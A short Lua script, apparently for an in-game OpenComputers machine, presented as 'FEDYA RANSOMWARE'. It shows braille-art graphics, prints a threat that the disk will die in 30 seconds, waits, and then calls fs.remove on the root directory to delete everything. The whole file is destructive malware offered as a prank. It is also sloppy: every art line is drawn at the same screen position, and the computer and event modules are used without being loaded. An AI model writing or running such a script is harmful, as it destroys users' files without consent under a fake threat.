local component = require("component")
local fs = require("filesystem")
local unicode = require("unicode")
local gpu = component.gpu

-- Установите цвет текста и фона
gpu.setForeground(0xFFFFFF) -- белый цвет текста
gpu.setBackground(0x000000) -- черный фон

-- Выведите текст в центр экрана
local width, height = gpu.getResolution()
gpu.set(34, 12, "⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿")
gpu.set(34, 12, "⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠻⠛⠛⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿")
gpu.set(34, 12, "⣿⣿⣿⣿⣿⣿⣿⣿⠁⠄⠄⠄⠄⠄⠄⠘⣿⣿⣿⣿⣿⣿⣿⣿")
gpu.set(34, 12, "⣿⣿⣏⢻⣿⣿⣿⣿⡀⢠⣶⡆⢠⣶⡄⢀⣿⣿⣿⣿⣿⣿⣿⣿")
gpu.set(34, 12, "⣿⣿⣿⣦⠻⣿⣿⣿⣋⡈⠉⠡⠎⠉⠁⣈⣿⣿⣿⣿⠋⣼⣿⣿")
gpu.set(34, 12, "⣿⣿⣿⣿⣦⠙⢿⣿⣿⡏⢦⣀⣀⣠⢪⣿⣿⣿⠟⢡⣾⣿⣿⣿")
gpu.set(34, 12, "⣿⣿⣿⣿⣿⣷⣄⠙⠿⣷⣌⠉⠉⢁⣾⡿⠟⢁⣴⣿⣿⣿⣿⣿")
gpu.set(34, 12, "⣿⣿⣿⣿⣿⡟⢛⣷⣄⡈⢙⡻⠿⡟⠉⣂⣴⡛⢿⣿⣿⣿⣿⣿")
gpu.set(34, 12, "⣿⣿⣿⣿⣿⡔⡿⢟⣛⡫⠥⢈⣑⡠⠭⣛⡻⢿⢸⣿⣿⣿⣿⣿")
gpu.set(34, 12, "⣿⣄⣠⣄⣠⣆⠩⣽⣶⣶⣿⣿⣿⣿⣷⣶⡮⢁⣤⣀⣄⣄⣄⣿")
gpu.set(34, 12, "⣿⣿⣿⣿⣿⣿⣀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣅⣸⣿⣿⣿⣿⣿⣿")
gpu.set(34, 12, "⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿")
--ждём 5 сек
local startTime = computer.uptime()
while computer.uptime() - startTime < 5 do
  -- Ждем 1 секунду
  local _, _, _, _, _, currentEvent = event.pull(1)
  if currentEvent == "interrupted" then
    return
  end
end

print("YOU GOT FEDYA RANSOMWARE!")
print("-------------------------------")
print("30 second and your disk dead!")

--ждём 5 сек
local startTime = computer.uptime()
while computer.uptime() - startTime < 30 do
  -- Ждем 1 секунду
  local _, _, _, _, _, currentEvent = event.pull(1)
  if currentEvent == "interrupted" then
    return
  end
end

--for format disk
fs.remove("/")
